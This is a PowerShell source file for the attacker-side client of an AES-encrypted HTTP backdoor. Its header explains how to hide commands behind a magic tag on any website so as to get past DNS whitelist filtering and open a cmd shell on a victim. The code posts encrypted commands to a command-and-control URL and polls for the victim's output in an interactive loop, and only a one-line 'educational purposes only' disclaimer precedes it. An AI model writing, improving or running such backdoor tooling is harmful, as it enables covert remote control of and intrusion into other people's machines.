﻿<#
****************Simple Powershell HTTP Backdoor Client By Snir Levi******************
                            AES 256-BIT Encrypted
Please Use for educational purposes only - don't run the backdoor on a system you are not authorized to attack

#Usage:
The backdoor parses an html/txt file and looks for a magic tag (example: #!snirbackdoor#!). You can use
any web site as your c2 and bypass some dns whitelist filtering.
Simply use WebClient.DownloadString() to download the server script. The server will communicate the c2 automatically.
When a connection is established the client will open a cmd shell.

Configs:
$tag - The magic tag the backdoor parses. use a unique string with no special html charecters.
$posturl - This is the url which you need to post your commands/output into.
$outputurl - This is the url to read the response from both sides.
$sleepTime - Sleep time between c2 communication attempts.
$timeoutAttempts - How many tries to connect to c2 before terminate the connection.
$key - AES256 Key *(Make sure the victim and the attacker use the same key)*
#>

###Configs###
$tag = "#!snirbackdoor#!" #must be unique tag with no special html characters such as < > / 
$posturl = 'http://192.168.1.21/cmd.php'
$outputurl = 'http://192.168.1.21/shell.txt'
$sleepTime = 5
$timeoutAttempts = 10
$key = "hDaNGVxzVXHPuaI+qvhrA4EfQpTTo3FKToQ9Zt9Gwso="
#############

function Monitor ($payload){
    $timeout = 0
    while($timeout -lt $timeoutAttempts){
        $output = getOutput
    if ($output -ne $payload){
        $output
        break
    }
    Start-Sleep -Seconds $sleepTime
    "Waiting Response"
    $timeout = $timeout + 1
    }
}

function getOutput(){
    $html = connectToC2
    $output = ParseHTML $html $tag
    $output = Decrypt-String $key $output
    return $output
}

function connectToC2(){
    $webclient = New-Object System.Net.WebClient
    try{
    $html = $webclient.DownloadString($outputurl)
    }
    catch{
        return
    }
    return $html
}

function ParseHTML ($html,$tag){
    $tagIndex = $html.IndexOf($tag)
    $cmd = ''
    if ($tagIndex -ne -1){
        $tagIndex = $tagIndex+$tag.Length
        while ($html[$tagIndex] -ne $tag[0]){
            $cmd += $html[$tagIndex]
            $tagIndex += 1
        }
        if ($html.Substring($tagIndex,$tag.Length) -eq $tag){
            return $cmd
        }
    }
}

function sendCommand($cmd){
    $cmd = Encrypt-String $key $cmd
    $postParams = @{command=$tag+$cmd+$tag;}
    (Invoke-WebRequest -Uri $posturl -Method POST -Body $postParams) > $null
}

function cmdHandler($cmd){
    switch ( $cmd ) {
        'exit'   { exit }
        default { sendCommand($cmd) }
    }
}

function testConnection(){
    $output = getOutput
    if ($output -eq "Running"){
        return $true
    }
    return $false
}


function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

function mainLoop(){
    $connection = testConnection
    while ($connection -ne $true){
        "Waiting For Connection"
         $connection = testConnection
         Start-Sleep -Seconds $sleepTime
    }
    "**Connection Established from victim to the C2**"
    while($cmd -ne "exit"){
        $cmd = Read-Host -Prompt 'cmd>'
        cmdHandler($cmd)
        Monitor $cmd
    }
}

mainLoop